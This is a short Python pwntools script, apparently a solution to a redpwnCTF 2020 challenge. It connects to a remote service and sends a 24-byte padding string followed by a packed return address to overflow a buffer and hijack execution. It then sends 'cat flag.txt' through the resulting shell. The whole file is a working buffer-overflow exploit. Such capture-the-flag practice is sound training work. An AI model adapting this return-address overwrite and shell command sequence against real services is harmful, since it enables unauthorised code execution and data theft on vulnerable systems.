from pwn import *

conn = remote('2020.redpwnc.tf', 31908)
while True:
	print(conn.recvline())
	print(conn.recvline())
	conn.sendline('a'*24 +'\xea\x06\x40\x00\x00\x00\x00')
	conn.sendline('cat flag.txt')
	
conn.close()